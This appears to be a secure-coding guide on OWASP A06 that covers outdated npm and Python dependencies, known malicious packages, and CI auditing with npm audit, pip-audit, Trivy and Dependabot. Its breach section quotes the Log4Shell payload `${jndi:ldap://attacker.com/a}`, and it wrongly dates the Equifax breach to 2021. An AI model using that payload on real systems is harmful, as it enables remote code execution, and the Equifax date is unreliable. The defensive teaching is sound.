# A06 — Vulnerable and Outdated Components

## Summary

Modern web applications depend on hundreds of third-party libraries, frameworks, and runtime components. Vulnerable and outdated components covers the risk that one or more of those dependencies contains a known security vulnerability that an attacker can exploit. Unlike most OWASP categories, this vulnerability does not require you to write bad code — it appears simply by running your application with an outdated or compromised package. The attack surface includes npm packages, Python packages, Docker base images, operating system packages, and the runtime itself (Node.js, Python, Java). Log4Shell (CVE-2021-44228) is the most visible recent example: a single vulnerable library used by thousands of applications across every industry.

---

## What It Looks Like

### Outdated packages with known CVEs

```json
// package.json — VULNERABLE: pinned to old versions with known CVEs
{
  "dependencies": {
    "express": "4.16.0",       // Older version — check npm audit
    "jsonwebtoken": "8.5.1",   // CVE-2022-23529: arbitrary secret in some configurations
    "axios": "0.21.1",         // CVE-2021-3749: ReDoS vulnerability
    "lodash": "4.17.15",       // CVE-2021-23337: command injection via template
    "next": "12.0.0"           // Multiple CVEs in older Next.js versions
  }
}
```

```python
# requirements.txt — VULNERABLE
Django==3.2.0          # Multiple CVEs since 3.2.0 — update to latest 3.2.x LTS
Pillow==8.0.0          # CVE-2021-34552: heap buffer overflow
cryptography==2.8      # Multiple CVEs — far behind current
requests==2.18.0       # Multiple security fixes since 2.18.0
```

### No audit in CI pipeline

```yaml
# .github/workflows/ci.yml — VULNERABLE: no dependency audit step
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install
      - run: npm test
      # Missing: npm audit --audit-level=high
```

### Using untrusted or typosquatted packages

```json
// package.json — DANGEROUS: typosquatted or unknown package
{
  "dependencies": {
    "crossenv": "7.0.0",       // Typosquat of "cross-env" — contained malware
    "event-stream": "3.3.6",   // 2018: malicious version injected into npm
    "node-ipc": "10.1.3"       // 2022: intentionally sabotaged to wipe files
  }
}
```

---

## The Fix

### Run `npm audit` and address findings

```bash
# Check for vulnerabilities
npm audit

# Automatically fix where possible
npm audit fix

# Fix including breaking changes (test afterwards)
npm audit fix --force

# Output machine-readable results for CI
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="high" or .value.severity=="critical")'
```

### Add dependency auditing to CI

```yaml
# .github/workflows/ci.yml — FIXED
name: CI
on: [push, pull_request]

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Node.js
        uses: actions/setup-node@v3
        with:
          node-version: "20"

      - name: Install dependencies
        run: npm ci

      - name: Audit for vulnerabilities
        run: npm audit --audit-level=high
        # This will fail the CI build if high or critical vulnerabilities are found

  python-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Install pip-audit
        run: pip install pip-audit

      - name: Audit Python dependencies
        run: pip-audit -r requirements.txt --desc on
```

### Python dependency auditing

```bash
# Install pip-audit
pip install pip-audit

# Audit your current environment
pip-audit

# Audit a specific requirements file
pip-audit -r requirements.txt

# Output in JSON format
pip-audit -r requirements.txt --format json
```

### Keep dependencies updated with Dependabot

```yaml
# .github/dependabot.yml — automatically opens PRs for security updates
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"

  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Scan Docker images for vulnerabilities

```bash
# Using Trivy (recommended — free, fast)
docker run --rm \
  -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image \
  --severity HIGH,CRITICAL \
  your-app-image:latest

# Or install Trivy locally
trivy image --severity HIGH,CRITICAL node:20-alpine
```

> **Critical:** A `package-lock.json` or `requirements.txt` pin gives you reproducible builds but does not protect you from vulnerabilities in pinned versions. Audit regularly — pinning old vulnerable versions is not safer than updating.

---

## Real-World Breach

**Log4Shell — December 2021 (CVE-2021-44228)**
Apache Log4j 2, a logging library used in virtually every Java application, contained a critical remote code execution vulnerability. An attacker could trigger it by logging a string like `${jndi:ldap://attacker.com/a}` — which Log4j would interpret and execute, connecting to the attacker's server and loading arbitrary code. The library was embedded in thousands of products including VMware, Cisco, Amazon Web Services infrastructure, and government systems worldwide. Within 72 hours of disclosure, over 800,000 exploitation attempts were recorded per hour. Many organisations took weeks to identify all affected systems because the dependency was often transitive (a dependency of a dependency of a dependency). Patches were available within 24 hours of disclosure, but organisations that had no dependency inventory had no way to know if they were affected.

---

## How to Test

### Check npm packages

```bash
# Full audit report
npm audit

# List all installed packages with versions
npm list --depth=0

# Check a specific package against known CVEs
npx is-website-vulnerable https://yourapp.com
```

### Check Python packages

```bash
pip-audit -r requirements.txt --desc on

# Also useful: check for packages not pinned in requirements
pip freeze > current-packages.txt
diff requirements.txt current-packages.txt
```

### Check for known malicious packages

```bash
# Socket.dev CLI — scans for supply chain risks
npx @socket/cli scan .

# Or use the GitHub App: socket.dev
```

### Check Docker base image

```bash
# Scan your Dockerfile's base image
trivy image node:18-alpine

# Check what packages are in your image
docker run --rm your-image:latest dpkg -l
```

---

## Checklist

- [ ] `npm audit --audit-level=high` (or equivalent) runs and passes in CI on every push
- [ ] `pip-audit` or `safety` runs in CI for Python projects
- [ ] Docker images are scanned with Trivy or Grype in CI
- [ ] Dependabot or Renovate is configured to open PRs for security updates automatically
- [ ] A software bill of materials (SBOM) exists or can be generated for your application
- [ ] All packages are pinned to specific versions in lockfiles (`package-lock.json`, `poetry.lock`, etc.)
- [ ] New packages are evaluated before adding (check download counts, maintainer history, npm/PyPI page)
- [ ] Node.js and Python runtime versions are within their official support lifecycle

---

## Why This Matters

Vulnerable dependencies are one of the few attack surfaces that require no interaction with your code. An attacker scanning the internet for Log4j, Struts, or a vulnerable version of `jsonwebtoken` will find your application if it is running a known vulnerable version. Unlike a bespoke vulnerability in your own code, public CVEs come with public exploit code. The window between CVE publication and active exploitation is often measured in hours. In 2021, the Equifax breach (147 million records, $575 million settlement) was caused by an unpatched Apache Struts vulnerability that had a patch available for two months before the attack.

---

## Learn More

- [OWASP A06:2021 — Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
- [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
- [OpenAuditor: Supply Chain Security](../../05-supply-chain-security/)
- [OpenAuditor: Pre-Commit Hooks](../../01-pre-commit-hooks/)
